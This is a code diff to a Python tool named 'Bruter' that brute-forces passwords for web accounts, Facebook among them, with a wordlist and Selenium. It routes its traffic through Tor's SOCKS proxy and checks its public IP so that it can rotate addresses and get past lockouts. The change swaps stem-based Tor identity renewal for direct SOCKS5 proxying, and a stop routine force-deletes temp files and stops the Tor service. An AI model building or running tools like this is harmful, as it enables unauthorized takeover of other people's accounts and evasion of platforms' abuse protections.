@@ -5,9 +5,6 @@ from subprocess import call
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support.ui import WebDriverWait
-from stem import Signal
-from stem.control import Controller
-from stem.connection import connect
 from pyvirtualdisplay import Display
 from urllib2 import urlopen
 
@@ -94,32 +91,9 @@ class Bruter(object):
 
     def stopTOR(self):   # Stoping Tor
 
-        driver.close()
-
         os.system("rm -rf tmp/ geckodriver.log && service tor stop")
 
         exit(1)
-
-
-    def Stem_start(self): # STEM Controller checking
-
-        
-        global controller
-
-        controller = Controller.from_port(port = 9051)
-
-        controller.authenticate(password=Hash)
-
-
-    def renew_tor(self):        # Reconnecting to tor by sending signal newnym
-
-        controller.signal(Signal.NEWNYM)
-
-    def connect_tor(self):
-
-        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5 , "127.0.0.1", 9050, True)
-
-        socket.socket = socks.socksocket
 
 
     def execute(self):   # Connection Between def main() 
@@ -137,15 +111,11 @@ class Bruter(object):
 
     def usercheck(self, username, service):          # Checking Username
 
-       display = Display(visible=0, size=(800, 600)) # Pyvirtual display starting
+     #  display = Display(visible=0, size=(800, 600)) # Pyvirtual display starting
 
-       display.start()
-
-       global driver       
+      # display.start()     
 
        driver = webdriver.Firefox()
-
-       self.Stem_start()
 
        try:
 
@@ -182,6 +152,8 @@ class Bruter(object):
     def webBruteforce(self, username, wordlist, service, delay):
 
         my_ip = urlopen("http://ip.42.pl/raw").read()
+
+        driver = webdriver.Firefox()
 
         if service == "facebook":
 
@@ -261,9 +233,9 @@ class Bruter(object):
 
                    j=0
 
-                   self.renew_tor()
+                   socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5 , "127.0.0.1", 9050, True)
 
-                   self.connect_tor()
+                   socket.socket = socks.socksocket
 
                    my_ip = urlopen("http://ip.42.pl/raw").read()
 
